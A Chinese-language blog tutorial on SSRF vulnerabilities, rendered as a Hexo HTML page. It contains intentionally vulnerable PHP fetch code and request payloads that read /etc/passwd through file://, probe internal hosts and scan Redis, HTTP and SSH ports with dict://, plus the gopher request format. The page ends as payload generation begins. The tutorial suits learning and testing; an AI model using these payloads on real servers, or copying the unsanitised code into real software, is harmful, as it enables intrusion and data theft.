@@ -1,0 +1,959 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="Chiexf">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://example.com/2023/09/01/web安全/ssrf/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="0x00 概念SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞利用一个可发起网络请求的服务器当作跳板来攻击其他服务。 0x01 原理服务端提供了从其他服务器应用获取数据的功能，且没有对目标地址做过滤与限制。 0x02 SSRF漏洞用途 扫描内外网的端口和服务 主机本地数据的读取 dos 攻击内外网存在的已知漏">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SSRF">
+<meta property="og:url" content="http://example.com/2023/09/01/Web%E5%AE%89%E5%85%A8/SSRF/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="0x00 概念SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞利用一个可发起网络请求的服务器当作跳板来攻击其他服务。 0x01 原理服务端提供了从其他服务器应用获取数据的功能，且没有对目标地址做过滤与限制。 0x02 SSRF漏洞用途 扫描内外网的端口和服务 主机本地数据的读取 dos 攻击内外网存在的已知漏">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2023-08-31T16:00:00.000Z">
+<meta property="article:modified_time" content="2023-10-19T12:53:31.657Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="SSRF">
+<meta name="twitter:card" content="summary">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/1.jpg" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/1.jpg">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/images/1.jpg">
+    <!--- Page Info-->
+    
+    <title>
+        
+            SSRF -
+        
+        Chiexf&#39;blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+<link rel="stylesheet" href="/fonts/fonts.css">
+
+    
+<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+    <!--- Font Part-->
+    
+    
+    
+        <link href="https://fonts.googleapis.com/css2?family=Noto+Sans+SC:wght@400;500;700&display=swap" rel="stylesheet">
+    
+    
+
+    <!--- Inject Part-->
+    
+    <script id="hexo-configurations">
+    let Global = window.Global || {};
+    Global.hexo_config = {"hostname":"example.com","root":"/","language":"zh-CN","path":"search.xml"};
+    Global.theme_config = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":true,"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null},"global":{"fonts":{"chinese":{"enable":true,"family":"Noto Sans SC","url":"https://fonts.googleapis.com/css2?family=Noto+Sans+SC:wght@400;500;700&display=swap"},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Chiexf' Blog","subtitle":{"text":["好好学习，天天向上！！！","CTRL + CV player~"],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"links":{"github":"https://github.com/Chiexf","instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.3.0","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Tags":{"path":"/tags"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"},"About":{"path":"/about","icon":"fa-regular fa-user"}},"search":{"enable":true,"preload":false}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"right","first_item":"info","announcement":null,"links":{"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Tags":{"path":"/tags","icon":"fa-regular fa-tags"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"auto","categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2022/8/17 11:45:14"};
+    Global.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"};
+    Global.data_config = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <span class="swup-progress-icon">
+            <i class="fa-solid fa-circle-notch fa-spin"></i>
+        </span>
+    
+</div>
+
+
+<main class="page-container" id="swup">
+    
+
+    
+
+    <div class="main-content-container">
+        
+
+        <div class="main-content-header">
+            <header class="navbar-container">
+    
+    <div class="navbar-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Chiexf&#39;blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-house"></i>
+                                        
+                                        首页
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/archives"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-archive"></i>
+                                        
+                                        归档
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/tags"  >
+                                    
+                                        
+                                        标签
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/categories"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-folder"></i>
+                                        
+                                        分类
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/about"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-user"></i>
+                                        
+                                        关于
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                        <li class="navbar-item search search-popup-trigger">
+                            <i class="fa-solid fa-magnifying-glass"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i></div>
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile drawer -->
+    <div class="navbar-drawer">
+        <ul class="drawer-navbar-list">
+            
+                
+                    <li class="drawer-navbar-item flex-center">
+                        <a class="" 
+                        href="/"  >
+                             
+                                
+                                    <i class="fa-regular fa-house"></i>
+                                
+                                首页
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item flex-center">
+                        <a class="" 
+                        href="/archives"  >
+                             
+                                
+                                    <i class="fa-regular fa-archive"></i>
+                                
+                                归档
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item flex-center">
+                        <a class="" 
+                        href="/tags"  >
+                             
+                                
+                                标签
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item flex-center">
+                        <a class="" 
+                        href="/categories"  >
+                             
+                                
+                                    <i class="fa-regular fa-folder"></i>
+                                
+                                分类
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item flex-center">
+                        <a class="" 
+                        href="/about"  >
+                             
+                                
+                                    <i class="fa-regular fa-user"></i>
+                                
+                                关于
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container">
+    <div class="article-content-container">
+
+        <div class="article-title">
+            
+                <h1 class="article-title-regular">SSRF</h1>
+            
+            </div>
+            
+                    
+        
+        
+            <div class="article-header">
+                <div class="avatar">
+                    <img src="/images/1.jpg">
+                </div>
+                <div class="info">
+                    <div class="author">
+                        <span class="name">Chiexf</span>
+                        
+                            <span class="author-label">Lv4</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2023-09-01</span>
+        <span class="mobile">2023-09-01</span>
+        <span class="hover-info">创建</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2023-10-19 20:53:31</span>
+            <span class="mobile">2023-10-19 20:53:31</span>
+            <span class="hover-info">更新</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/Web%E5%AE%89%E5%85%A8/">Web安全</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/SSRF/">SSRF</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        <div class="article-content markdown-body">
+            <h1 id="0x00-概念"><a href="#0x00-概念" class="headerlink" title="0x00 概念"></a>0x00 概念</h1><p>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞利用一个可发起网络请求的服务器当作跳板来攻击其他服务。</p>
+<h1 id="0x01-原理"><a href="#0x01-原理" class="headerlink" title="0x01 原理"></a>0x01 原理</h1><p>服务端提供了从其他服务器应用获取数据的功能，且没有对目标地址做过滤与限制。</p>
+<h1 id="0x02-SSRF漏洞用途"><a href="#0x02-SSRF漏洞用途" class="headerlink" title="0x02 SSRF漏洞用途"></a>0x02 SSRF漏洞用途</h1><ul>
+<li>扫描内外网的端口和服务</li>
+<li>主机本地数据的读取</li>
+<li>dos</li>
+<li>攻击内外网存在的已知漏洞</li>
+</ul>
+<h1 id="0x03-产生漏洞的函数"><a href="#0x03-产生漏洞的函数" class="headerlink" title="0x03 产生漏洞的函数"></a>0x03 产生漏洞的函数</h1><h2 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents()"></a>file_get_contents()</h2><ul>
+<li>从用户指定的url获取内容，然后指定一个文件名进行保存，并展示给用户。</li>
+</ul>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ssrf.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];;</span><br><span class="line">	<span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<h2 id="fsockopen"><a href="#fsockopen" class="headerlink" title="fsockopen()"></a>fsockopen()</h2><ul>
+<li>打开 Internet 或者 Unix 套接字连接</li>
+</ul>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$host</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$fp</span> = <span class="title function_ invoke__">fsockopen</span>(<span class="variable">$host</span>, <span class="number">80</span>, <span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="number">30</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$fp</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$errstr</span> (<span class="subst">$errno</span>)\n&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$out</span> = <span class="string">&quot;GET / HTTP/1.1\r\n&quot;</span>;</span><br><span class="line">    <span class="variable">$out</span> .= <span class="string">&quot;Host: <span class="subst">$host</span>\r\n&quot;</span>;</span><br><span class="line">    <span class="variable">$out</span> .= <span class="string">&quot;Connection: Close\r\n\r\n&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="variable">$out</span>);</span><br><span class="line">    <span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$fp</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">fgets</span>(<span class="variable">$fp</span>, <span class="number">128</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<h2 id="curl-exec"><a href="#curl-exec" class="headerlink" title="curl_exec()"></a>curl_exec()</h2><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">	<span class="variable">$link</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">	<span class="variable">$curlobj</span> = <span class="title function_ invoke__">curl_init</span>(); <span class="comment">// 创建新的 cURL 资源</span></span><br><span class="line">	<span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>, CURLOPT_POST, <span class="number">0</span>);</span><br><span class="line">	<span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>,CURLOPT_URL,<span class="variable">$link</span>);</span><br><span class="line">	<span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>); <span class="comment">// 设置 URL 和相应的选项</span></span><br><span class="line">	<span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$curlobj</span>); <span class="comment">// 抓取 URL 并把它传递给浏览器</span></span><br><span class="line">	<span class="title function_ invoke__">curl_close</span>(<span class="variable">$curlobj</span>); <span class="comment">// 关闭 cURL 资源，并且释放系统资源</span></span><br><span class="line"> </span><br><span class="line">	<span class="comment">// $filename = &#x27;./curled/&#x27;.rand().&#x27;.txt&#x27;;</span></span><br><span class="line">	<span class="comment">// file_put_contents($filename, $result); </span></span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<h2 id="readfile"><a href="#readfile" class="headerlink" title="readfile()"></a>readfile()</h2><ul>
+<li>与**file_get_contents()**类似，输出一个文件的内容。</li>
+</ul>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">	<span class="title function_ invoke__">readfile</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<h2 id="fopen"><a href="#fopen" class="headerlink" title="fopen()"></a>fopen()</h2><ul>
+<li>打开一个文件或者URL</li>
+<li>配合<code>fread</code>才能够进行回显</li>
+</ul>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">	<span class="comment">//fopen.php</span></span><br><span class="line">	<span class="variable">$file</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>], <span class="string">&#x27;r&#x27;</span>);</span><br><span class="line">	<span class="keyword">echo</span> <span class="title function_ invoke__">fread</span>(<span class="variable">$file</span>, <span class="number">4096</span>);<span class="comment">//限制读取大小 4096</span></span><br><span class="line">	<span class="title function_ invoke__">fclose</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<h1 id="0x04-SSRF漏洞利用"><a href="#0x04-SSRF漏洞利用" class="headerlink" title="0x04 SSRF漏洞利用"></a>0x04 SSRF漏洞利用</h1><h2 id="SSRf中的URL伪协议"><a href="#SSRf中的URL伪协议" class="headerlink" title="SSRf中的URL伪协议"></a>SSRf中的URL伪协议</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">file:// 从文件系统中获取文件内容，如，file:///etc/passwd</span><br><span class="line">dict:// 字典服务器协议，访问字典资源，如dict://ip:6379/info，通过dict 协议可以远程访问一个指定的tcp 端口，并且会返回端口所提供的服务的部分组件信息，当目标端口开放（有服务信息显示，但会报错）</span><br><span class="line"></span><br><span class="line">sftp:// ssh文件传输协议或安全文件传输协议</span><br><span class="line">ldap:// 轻量级目录访问协议</span><br><span class="line">tftp:// 简单文件传输协议</span><br><span class="line">gopher:// 分布式文档传递服务，可使用gopherus生成payload</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h2><ul>
+<li>代码</li>
+</ul>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ssrf.php</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">	<span class="variable">$link</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">	<span class="variable">$curlobj</span> = <span class="title function_ invoke__">curl_init</span>(); <span class="comment">// 创建新的 cURL 资源</span></span><br><span class="line">	<span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>, CURLOPT_POST, <span class="number">0</span>);</span><br><span class="line">	<span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>,CURLOPT_URL,<span class="variable">$link</span>);</span><br><span class="line">	<span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>); <span class="comment">// 设置 URL 和相应的选项</span></span><br><span class="line">	<span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$curlobj</span>); <span class="comment">// 抓取 URL 并把它传递给浏览器</span></span><br><span class="line">	<span class="title function_ invoke__">curl_close</span>(<span class="variable">$curlobj</span>); <span class="comment">// 关闭 cURL 资源，并且释放系统资源</span></span><br><span class="line"> </span><br><span class="line">	<span class="comment">// $filename = &#x27;./curled/&#x27;.rand().&#x27;.txt&#x27;;</span></span><br><span class="line">	<span class="comment">// file_put_contents($filename, $result); </span></span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li>测试环境</li>
+</ul>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">外网IP: 192.168.33.333</span><br><span class="line">内网IP: 192.168.22.222</span><br><span class="line"></span><br><span class="line">网段: 192.168.22.0/24</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="伪协议读取文件"><a href="#伪协议读取文件" class="headerlink" title="伪协议读取文件"></a>伪协议读取文件</h2><ul>
+<li>payload</li>
+</ul>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=file:///etc/passwd</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="探测内网主机存活"><a href="#探测内网主机存活" class="headerlink" title="探测内网主机存活"></a>探测内网主机存活</h2><ul>
+<li>读取&#x2F;etc&#x2F;hosts、&#x2F;proc&#x2F;net&#x2F;arp、&#x2F;proc&#x2F;net&#x2F;fib_trie等文件，从而获得目标主机的内网网段并进行爆破。</li>
+<li>IP地址分类</li>
+</ul>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">A: 10.0.0.0 - 10.255.255.255</span><br><span class="line">B: 172.16.0.0 - 172.31.255.255</span><br><span class="line">C: 192.168.0.0 - 192.168.255.255</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li>payload</li>
+</ul>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?url=http://192.168.22.1</span><br><span class="line">?url=http://192.168.22.5</span><br><span class="line">......</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="扫描内网端口"><a href="#扫描内网端口" class="headerlink" title="扫描内网端口"></a>扫描内网端口</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">redis:</span><br><span class="line">?url=dict://192.168.22.1:6379</span><br><span class="line">?url=dict://192.168.22.1:6379/info </span><br><span class="line">http:</span><br><span class="line">?url=dict://192.168.22.1:80</span><br><span class="line">?url=dict://192.168.22.1:80/info</span><br><span class="line">ssh:</span><br><span class="line">?url=dict://192.168.22.1:22</span><br><span class="line">?url=dict://192.168.22.1:22/info</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="gopher协议利用"><a href="#gopher协议利用" class="headerlink" title="gopher协议利用"></a>gopher协议利用</h2><h3 id="在各编程语言中的限制"><a href="#在各编程语言中的限制" class="headerlink" title="在各编程语言中的限制"></a>在各编程语言中的限制</h3><table>
+<thead>
+<tr>
+<th>协议</th>
+<th>PHP</th>
+<th>Java</th>
+<th>Curl</th>
+<th>Perl</th>
+<th>ASP.NET</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>gopher</td>
+<td>–wite-curlwrappers且php版本至少为5.3</td>
+<td>jdk&lt;1.7</td>
+<td>低版本不支持</td>
+<td>支持</td>
+<td>小于版本3</td>
+</tr>
+</tbody></table>
+<h3 id="协议格式"><a href="#协议格式" class="headerlink" title="协议格式"></a>协议格式</h3><ul>
+<li>gopher的默认端口是70</li>
+<li>post请求，回车换行需要使用%0d%0a，多个参数之间的&amp;需要url编码</li>
+</ul>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">URL:gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_后接TCP数据流</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li>不要忘了下划线<code>_</code>,否则服务的接收到的消息将不完整，该字符可随意。</li>
+</ul>
+<h3 id="发送GET请求"><a href="#发送GET请求" class="headerlink" title="发送GET请求"></a>发送GET请求</h3><ul>
+<li>测试代码</li>
+</ul>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// echo.php</span><br><span class="line">&lt;?php</span><br><span class="line">	echo &quot;Hello &quot;.$_GET[&quot;whoami&quot;].&quot;\n&quot;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li>抓包</li>
+</ul>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET /echo.php?whoami=Bunny HTTP/1.1</span><br><span class="line">Host: 192.168.1.1</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li>利用脚本生成payload</li>
+</ul>
